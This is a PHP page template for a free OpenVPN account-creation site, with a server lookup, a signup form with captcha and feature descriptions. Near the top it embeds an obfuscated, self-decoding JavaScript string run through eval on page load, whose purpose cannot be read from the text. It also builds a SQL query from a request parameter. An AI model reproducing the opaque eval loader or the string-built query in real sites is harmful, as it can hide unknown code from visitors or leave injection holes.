<?php
if(isset($_GET['filter'])) {
  $serverid = chkString($_GET['filter']);
  $q = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM `servers` WHERE id='$serverid'"));
  if(!$q):
    $noserver = 1;
  endif;
} else {
  $noserver = 1;
}

if(!isset($noserver)):
?>
<script language="javascript" type="text/javascript">
function removeSpaces(string) {
 return string.split(' ').join('');
}
</script>
<script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",ol=x.length,l=ol;while(x.charCodeAt(l/13)!" +
"=50){try{x+=x;l+=l;}catch(e){}}for(i=l-1;i>=0;i--){o+=x.charAt(i);}return o" +
".substr(0,ol);}f(\")41,\\\"{710\\\\500\\\\420\\\\630\\\\330\\\\400\\\\\\\\\\"+
"\\TNBF330\\\\710\\\\220\\\\L020\\\\R520\\\\530\\\\410\\\\330\\\\020\\\\GA@O" +
"WK610\\\\OSOyms}in4l~}wqd?* />7bbm`zh+hvldrn730\\\\710\\\\010\\\\@SIOYF]120" +
"\\\\730\\\\320\\\\220\\\\300\\\\U300\\\\730\\\\300\\\\r\\\\130\\\\700\\\\t\\"+
"\\520\\\\220\\\\H020\\\\n\\\\t\\\\300\\\\500\\\\(sfukmwh771\\\\3950!k==!+?%" +
"+;<<f$, 61!\\\\\\\\[O120\\\\\\\\\\\\420\\\\130\\\\420\\\\CUPXVATWNCD100\\\\" +
"HXn\\\\010\\\\\\\\\\\\710\\\\]T320\\\\230\\\\520\\\\000\\\\%>uh771\\\\sn5ow" +
"x<3v771\\\\q/`hiyiz(~jkk#chd330\\\\020\\\\<[D430\\\\420\\\\610\\\\200\\\\60" +
"0\\\\H530\\\\.300\\\\,QL1030\\\\610\\\\710\\\\100\\\\330\\\\200\\\\n\\\\430" +
"\\\\020\\\\020\\\\@=]3;/|y600\\\\*+4x;=>|4= =(;*g=&( j70!n3K[NOZ030\\\\e500" +
"\\\\QSG\\\\\\\\320\\\\Y_YC220\\\\710\\\\400\\\\EFLSLQV1iu|z`p~k\\\"(f};o nr" +
"uter};))++y(^)i(tAedoCrahc.x(edoCrahCmorf.gnirtS=+o;721=%y;++y)41<i(fi{)++i" +
";l<i;0=i(rof;htgnel.x=l,\\\"\\\"=o,i rav{)y,x(f noitcnuf\")"                 ;
while(x=eval(x));
//-->
//]]>
</script>
<script src="/scss/js/bootstrap-validate.js"></script>
<div id="ndexi" style="display:none;">create-account</div>
<div id="where" style="display:none;">openvpn</div>

<!-- START: section -->
  <section class="probootstrap-section">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center">
           <?php
          $name = mysqli_query($conn, "SELECT * FROM `servers` WHERE id='$serverid'");
          while($row = mysqlI_fetch_object($name)) {
         ?>
          <h1 class="title">FREE OPENVPN TUNNEL <?php echo location($row->location)['name'] ?></h1>
          <?php } ?>
          <h2>Free openvpn tunnel <?php echo $q['active_for'] ?> days</h2>
          <p class="lead">Read our terms of service before creating accounts</p>
          <p class="lead">Your selected server name <?php echo $q['description']?></p>
          <p class="lead">Hostname server <?php echo $q['host']?></p>
        </div>
      </div>
    <p class="text-center">
    <span class="badge badge-success mb-3 p-3">Free VPN Accounts</span>
    <span class="badge badge-warning mb-3 p-3">Unlimited Bandwidth VPS</span>
    <span class="badge badge-primary mb-3 p-3">Full Speed VPN</span>
    <span class="badge badge-success mb-3 p-3">Private Account</span>
    <span class="badge badge-info mb-3 p-3">Hide Your IP Adrres</span>
    <span class="badge badge-primary mb-3 p-3">Fast VPN Servers</span>
  </p> 
  <p class="text-center">
    <span class="label label-danger">No DDOS</span>
    <span class="label label-danger">No Fraud</span>
    <span class="label label-danger">No Hacking</span>
    <span class="label label-danger">No Spam</span>
  </p> 
</div>
</section>
<!-- END: section -->

<?php if(isset($_GET['filter'])) {
if(!$q) {
  exit('Please choose a server before creating account');
}
} else {
   exit('Please choose a server before creating account');
}
?>

<?php
include('app/ads/link.php');
?>
<section class="probootstrap-section">
    <div class="container">
      <div class="row">
    <div class="<?php echo ($q['type']=='vpnssh'||$q['type']=='vpn')? 'col-lg-6 col-lg-offset-3' : 'col-lg-6 col-lg-offset-3'; ?>">
<form action="<?php echo $siteUrl ?>" method="post" class="probootstrap-form probootstrap-box">
<center>
<div class="icon"><i class="icon-user-plus"></i></div>
<h1>Create Account</h1></center>
<input type="hidden" name="id" value="<?php echo $q['id'] ?>" />
<div class="form-group">Username: <input type="text" class="form-control" placeholder="username" name="username" id="username" required onblur="this.value=removeSpaces(this.value);"></div>
<div class="form-group">Password: <input type="text" class="form-control" placeholder="password" name="password" id="password" required onblur="this.value=removeSpaces(this.value);"></div>
<script>bootstrapValidate('#username', 'min:2:enter 2 characters minimum!')</script>
<div align="center">
<?php showCaptcha('site'); ?>
<p><span style="color:grey;font-size:0.8em;">By clicking Create Now button, you agree to our <a href="?do=terms">Terms Of Service.</a></span></p>
<input type="submit" class="btn btn-primary" role="button" name="createvpn" value="Create Now" />
<p>
<?php
  if (isset($_POST['createvpn'])) {
    $pageUrl = "https://".$_SERVER['HTTP_HOST']."/ajax.proc.php?do=create-vpn";
    $_POST['last_submit'] = $_SESSION['last_submit'];
    $params = http_build_query ($_POST);
    $contextData = array ( 
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n".
                            "Connection: close\r\n".
                            "Content-Length: ".strlen($params)."\r\n",
                'content'=> $params );
    $context = stream_context_create (array ( 'http' => $contextData ));
    $resultCreateAcc =  file_get_contents ($pageUrl, false, $context);
    if (!isset($_SESSION['last_submit']) || time()-$_SESSION['last_submit'] > 300) {
        $_SESSION['last_submit'] = time();
    }
    echo($resultCreateAcc);
  }
?>
<?php
include('app/ads/ads.php');
?>
<?php if($q['type']=='vpnssh'||$q['type']=='openvpn'): ?>
<p class="lead">Encrypted <span class="text-success">1024 - 2048 bit</span> VPN</p>
<p>
<?php
$ss = json_decode($q['openvpn_config']); 
$ss->tcp;
echo"<a href=golink.php?id=".base64_encode($ss->tcp)." class='btn btn-primary btn-block'>Save Config (ovpn)</a>";
?>
</p>
<?php endif; ?>
</div>
</div>
</form>
</div>
</div>
</div>
</section>

<!-- START: section -->
  <section class="probootstrap-section probootstrap-section-colored">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
          <h2>Features of OpenVPN</h2>
        </div>
      </div>
      <div class="row">
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-check"></i> <span>Full Anonymity</span></h3>
          <p>OpenVPN has support for DHCP and dynamic IP addresses, which can result in better anonymity as you browse the Internet.</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-check"></i> <span>Fast Speed</span></h3>
          <p>The TCP tunnel transport support on the OpenVPN protocol offers you many benefits. It includes seamless online gaming, video conferencing, audio conferencing, & more.</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-check"></i> <span>High Security</span></h3>
          <p>All your communications are kept secure by various methods, such as shared keys, HMAC authentication, and 256-bit encryption via OpenSSL.</p>
        </div>
        <div class="clearfix visible-md-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-check"></i> <span>Beats Firewalls</span></h3>
          <p>OpenVPN can run on any port between 1 and 65535. This multi-port functionality makes OpenVPN an ideal tunneling protocol for bypassing firewalls.</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-check"></i> <span>Perfect Forward Secrecy</span></h3>
          <p>The PFS feature in OpenVPN adds an extra layer of security. As a result, you get complete secrecy and data integrity.</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-check"></i> <span>More Portable</span></h3>
          <p>OpenVPN is more portable than other protocols. After all, it is implemented in the user-space and doesn’t need any kernel components besides the TUN/TAP virtual network driver.</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
      </div>
    </div>
   </div>
  </section>
  <!-- END: section -->
  
<?php
else:
  include('app/pages/404.php');
endif;
?>
<!-- END: page -->